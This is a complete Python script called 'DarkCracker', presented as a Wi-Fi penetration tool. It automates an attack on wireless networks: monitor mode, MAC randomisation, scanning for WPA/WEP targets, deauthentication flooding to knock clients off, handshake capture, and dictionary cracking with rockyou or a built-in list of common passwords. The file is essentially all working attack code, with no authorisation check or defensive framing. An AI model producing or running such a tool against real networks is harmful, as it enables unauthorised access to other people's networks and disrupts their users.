#!/usr/bin/env python3

import os
import sys
import time
import signal
import shutil
import subprocess
import tempfile
import re
import json
from datetime import datetime
from colorama import Fore, Style, init
from pyfiglet import Figlet
import tkinter as tk
from tkinter import filedialog

init(autoreset=True)

airodump_process = None
deauth_process = None
running = True
handshake_captured = False

def signal_handler(sig, frame):
    global running
    print(f"\n{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
    running = False
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def show_banner():
    os.system("clear" if os.name == "posix" else "cls")
    banner = Figlet(font='slant', width=100)
    print(f"{Fore.CYAN}{banner.renderText('DarkCracker ')}")
    print(f"{Fore.YELLOW}Advanced Wi-Fi Penetration Tool | Version 1.2 | Developed by OverH4shX{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}---------------------------------------------------------------{Style.RESET_ALL}\n")

def check_root():
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This tool must be run with root privileges. Use 'sudo'.{Style.RESET_ALL}")
        exit(1)

def check_dependencies():
    required_tools = [
        "aircrack-ng", "airodump-ng", "tshark", "iw", 
        "airmon-ng", "aireplay-ng", "macchanger"
    ]
    
    missing = []
    for tool in required_tools:
        if shutil.which(tool) is None:
            missing.append(tool)
    
    if missing:
        print(f"{Fore.RED}[!] Missing dependencies: {', '.join(missing)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Install missing tools with: sudo apt install {' '.join(missing)}{Style.RESET_ALL}")
        exit(1)
    
    print(f"{Fore.GREEN}[+] All dependencies are installed{Style.RESET_ALL}")

def get_wireless_interfaces():
    try:
        result = subprocess.check_output("iw dev", shell=True, stderr=subprocess.DEVNULL).decode().splitlines()
        interfaces = [line.split()[-1] for line in result if "Interface" in line]
        return interfaces
    except subprocess.CalledProcessError:
        return []

def enable_monitor_mode(interface):
    print(f"{Fore.YELLOW}[*] Enabling monitor mode on {interface}...{Style.RESET_ALL}")
    
    subprocess.call(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    result = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True)
    
    monitor_iface = None
    for line in result.stdout.splitlines():
        if "monitor mode" in line and "enabled" in line:
            parts = line.split()
            if parts[0].endswith("mon"):
                monitor_iface = parts[0]
                break
    
    if not monitor_iface:
        iwconfig = subprocess.getoutput("iwconfig")
        for line in iwconfig.splitlines():
            if "Mode:Monitor" in line:
                monitor_iface = line.split()[0]
                break
    
    if monitor_iface:
        print(f"{Fore.GREEN}[+] Monitor interface: {monitor_iface}{Style.RESET_ALL}")
        try:
            subprocess.call(["macchanger", "-r", monitor_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Fore.GREEN}[+] MAC address randomized{Style.RESET_ALL}")
        except:
            print(f"{Fore.YELLOW}[!] MAC randomization failed{Style.RESET_ALL}")
        return monitor_iface
    
    print(f"{Fore.RED}[!] Failed to enable monitor mode{Style.RESET_ALL}")
    return interface

def select_interface():
    interfaces = get_wireless_interfaces()
    
    if not interfaces:
        print(f"{Fore.RED}[!] No wireless interfaces found{Style.RESET_ALL}")
        exit(1)
    
    print(f"{Fore.CYAN}[+] Available interfaces:{Style.RESET_ALL}")
    for idx, iface in enumerate(interfaces):
        print(f"  {Fore.YELLOW}[{idx}]{Style.RESET_ALL} {iface}")
    
    while True:
        try:
            choice = int(input(f"{Fore.CYAN}[?] Select interface: {Style.RESET_ALL}").strip())
            if 0 <= choice < len(interfaces):
                return enable_monitor_mode(interfaces[choice])
        except ValueError:
            pass
        print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")

def select_band():
    print(f"\n{Fore.CYAN}[+] Select band:{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} 2.4GHz (b/g/n)")
    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} 5GHz (a/ac)")
    print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} Both bands")
    
    while True:
        choice = input(f"{Fore.CYAN}[?] Choose band: {Style.RESET_ALL}").strip()
        if choice == "1":
            return "bg"
        elif choice == "2":
            return "a"
        elif choice == "3":
            return "abg"
        print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")

def scan_networks(adapter, band, scan_time=15):
    print(f"{Fore.YELLOW}[*] Scanning for networks for {scan_time} seconds...{Style.RESET_ALL}")
    
    temp_dir = tempfile.mkdtemp()
    csv_path = os.path.join(temp_dir, "net_scan")
    
    cmd = [
        "airodump-ng", 
        "--band", band, 
        "--write", csv_path, 
        "--output-format", "csv",
        "--ignore-negative-one", 
        adapter
    ]
    
    global airodump_process
    airodump_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    for i in range(scan_time):
        if not running:
            return None
        print(f"{Fore.YELLOW}[*] Scanning... {scan_time - i}s remaining{Style.RESET_ALL}", end='\r')
        time.sleep(1)
    
    if airodump_process and airodump_process.poll() is None:
        airodump_process.terminate()
        airodump_process.wait()
    
    csv_file = csv_path + "-01.csv"
    if os.path.exists(csv_file):
        return csv_file
    
    print(f"{Fore.RED}[!] Scan file not found{Style.RESET_ALL}")
    return None

def parse_scan_results(csv_file):
    networks = []
    
    if not os.path.exists(csv_file):
        print(f"{Fore.RED}[!] Scan file not found{Style.RESET_ALL}")
        return networks
    
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
            start_index = 0
            for i, line in enumerate(lines):
                if line.startswith("BSSID,"):
                    start_index = i + 1
                    break
            
            for line in lines[start_index:]:
                if line.strip() == "":
                    break
                
                parts = line.split(',')
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    speed = parts[4].strip()
                    encryption = parts[5].strip()
                    power = parts[8].strip()
                    beacons = parts[9].strip()
                    ivs = parts[10].strip()
                    essid = parts[13].strip()
                    
                    if "WPA" in encryption or "WPA2" in encryption or "WEP" in encryption:
                        networks.append({
                            "bssid": bssid,
                            "channel": channel,
                            "encryption": encryption,
                            "power": power,
                            "essid": essid,
                            "clients": []
                        })
    
    except Exception as e:
        print(f"{Fore.RED}[!] Error parsing scan results: {str(e)}{Style.RESET_ALL}")
    
    return networks

def display_networks(networks):
    if not networks:
        print(f"{Fore.RED}[!] No networks found{Style.RESET_ALL}")
        return None
    
    print(f"\n{Fore.CYAN}[+] Discovered networks:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'Index':<6}{'ESSID':<25}{'BSSID':<18}{'Channel':<8}{'Power':<8}{'Encryption':<12}{Style.RESET_ALL}")
    print("-" * 80)
    
    for idx, net in enumerate(networks):
        try:
            power = int(net['power'])
            if power >= -50:
                power_color = Fore.GREEN
            elif power >= -70:
                power_color = Fore.YELLOW
            else:
                power_color = Fore.RED
            power_display = f"{power_color}{net['power']}{Style.RESET_ALL}"
        except:
            power_display = net['power']
        
        essid = net['essid'] if net['essid'] else "<hidden>"
        if len(essid) > 22:
            essid = essid[:19] + "..."
        
        print(f"{Fore.YELLOW}{idx:<6}{Style.RESET_ALL}{essid:<25}{net['bssid']:<18}{net['channel']:<8}{power_display:<8}{net['encryption']:<12}")
    
    print("-" * 80)
    return networks

def select_target(networks):
    if not networks:
        return None
    
    while True:
        try:
            choice = int(input(f"{Fore.CYAN}[?] Select target network: {Style.RESET_ALL}").strip())
            if 0 <= choice < len(networks):
                target = networks[choice]
                print(f"\n{Fore.GREEN}[+] Target selected: {target['essid']} ({target['bssid']}) on channel {target['channel']}{Style.RESET_ALL}")
                return target
        except ValueError:
            pass
        print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")

def capture_handshake(adapter, target, temp_dir, max_attempts=5):
    global handshake_captured, running
    print(f"{Fore.YELLOW}[*] Starting handshake capture...{Style.RESET_ALL}")
    
    handshake_dir = os.path.join(os.getcwd(), "handshakes")
    os.makedirs(handshake_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    essid_safe = re.sub(r'\W+', '', target['essid'])[:20] if target['essid'] else "hidden"
    cap_filename = f"{essid_safe}_{timestamp}.cap"
    cap_path = os.path.join(handshake_dir, cap_filename)
    
    base = os.path.join(temp_dir, "handshake_capture")
    
    attempt = 1
    handshake_captured = False
    
    while attempt <= max_attempts and running and not handshake_captured:
        print(f"\n{Fore.CYAN}[*] Attempt {attempt}/{max_attempts}{Style.RESET_ALL}")
        
        airodump_cmd = [
            "airodump-ng",
            "--bssid", target['bssid'],
            "--channel", target['channel'],
            "--write", base,
            "--output-format", "cap",
            "--ignore-negative-one",
            adapter
        ]
        global airodump_process
        airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(5)
        
        print(f"{Fore.YELLOW}[*] Sending deauthentication packets...{Style.RESET_ALL}")
        deauth_cmd = [
            "aireplay-ng",
            "--deauth", "10",
            "-a", target['bssid'],
            adapter
        ]
        global deauth_process
        deauth_process = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        deauth_process.wait()
        
        print(f"{Fore.YELLOW}[*] Waiting for handshake...{Style.RESET_ALL}")
        start_time = time.time()
        timeout = 60
        
        while time.time() - start_time < timeout and running and not handshake_captured:
            cap_files = [f for f in os.listdir(temp_dir) if f.startswith("handshake_capture") and f.endswith(".cap")]
            
            if cap_files:
                cap_file = os.path.join(temp_dir, cap_files[0])
                if verify_handshake(cap_file):
                    handshake_captured = True
                    shutil.copy(cap_file, cap_path)
                    print(f"\n{Fore.GREEN}[+] Handshake captured and saved as {cap_path}{Style.RESET_ALL}")
                    break
            
            elapsed = int(time.time() - start_time)
            remaining = timeout - elapsed
            print(f"{Fore.YELLOW}[*] Waiting... {remaining}s remaining{Style.RESET_ALL}", end='\r')
            time.sleep(2)
        
        if airodump_process and airodump_process.poll() is None:
            airodump_process.terminate()
            airodump_process.wait()
        
        attempt += 1
    
    if not handshake_captured:
        print(f"\n{Fore.RED}[!] Failed to capture handshake after {max_attempts} attempts{Style.RESET_ALL}")
        return None
    
    return cap_path

def verify_handshake(cap_file):
    try:
        result = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True,
            text=True,
            timeout=30
        )
        return "1 handshake" in result.stdout
    except:
        return False

def crack_handshake(cap_file):
    if not cap_file or not os.path.exists(cap_file):
        print(f"{Fore.RED}[!] Handshake file not found{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.CYAN}[+] Handshake cracking options:{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} Select wordlist file")
    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} Use built-in wordlists")
    print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} Cancel")
    
    choice = input(f"{Fore.CYAN}[?] Choose option: {Style.RESET_ALL}").strip()
    
    if choice == "3":
        return
    
    wordlist = None
    
    if choice == "1":
        root = tk.Tk()
        root.withdraw()
        wordlist = filedialog.askopenfilename(title="Select Wordlist File")
        root.destroy()
        
        if not wordlist or not os.path.exists(wordlist):
            print(f"{Fore.RED}[!] Invalid wordlist file{Style.RESET_ALL}")
            return
    
    elif choice == "2":
        print(f"{Fore.CYAN}\n[+] Available built-in wordlists:{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} rockyou.txt (Comprehensive)")
        print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} darkcracker_top1000.txt (Top 1000 passwords)")
        
        wl_choice = input(f"{Fore.CYAN}[?] Select wordlist: {Style.RESET_ALL}").strip()
        
        if wl_choice == "1":
            wordlist = "/usr/share/wordlists/rockyou.txt"
            if not os.path.exists(wordlist):
                print(f"{Fore.RED}[!] rockyou.txt not found. Try installing it with: sudo apt install wordlists{Style.RESET_ALL}")
                return
        elif wl_choice == "2":
            top_passwords = [
                "password", "123456", "123456789", "12345678", "12345", "qwerty", 
                "abc123", "password1", "1234567", "1234567890", "123123", "000000",
                "iloveyou", "1234", "1q2w3e4r", "sunshine", "princess", "admin"
            ]
            
            wordlist = tempfile.mktemp(suffix=".txt")
            with open(wordlist, "w") as f:
                f.write("\n".join(top_passwords))
        else:
            print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            return
    
    if wordlist:
        print(f"{Fore.YELLOW}[*] Starting cracking process...{Style.RESET_ALL}")
        cmd = f"aircrack-ng -w '{wordlist}' '{cap_file}'"
        os.system(cmd)
    else:
        print(f"{Fore.RED}[!] No wordlist selected{Style.RESET_ALL}")

def cleanup():
    global airodump_process, deauth_process
    
    if airodump_process and airodump_process.poll() is None:
        airodump_process.terminate()
    if deauth_process and deauth_process.poll() is None:
        deauth_process.terminate()
    
    interfaces = get_wireless_interfaces()
    for iface in interfaces:
        if "mon" in iface:
            subprocess.call(["airmon-ng", "stop", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    show_banner()
    check_root()
    check_dependencies()
    
    adapter = select_interface()
    band = select_band()
    
    with tempfile.TemporaryDirectory() as temp_dir:
        csv_file = scan_networks(adapter, band)
        if not csv_file:
            print(f"{Fore.RED}[!] Network scan failed{Style.RESET_ALL}")
            return
        
        networks = parse_scan_results(csv_file)
        display_networks(networks)
        
        target = select_target(networks)
        if not target:
            return
        
        cap_file = capture_handshake(adapter, target, temp_dir)
        
        if cap_file:
            crack_handshake(cap_file)
        else:
            print(f"{Fore.RED}[!] Handshake capture failed{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}[+] Operation completed{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
    cleanup()
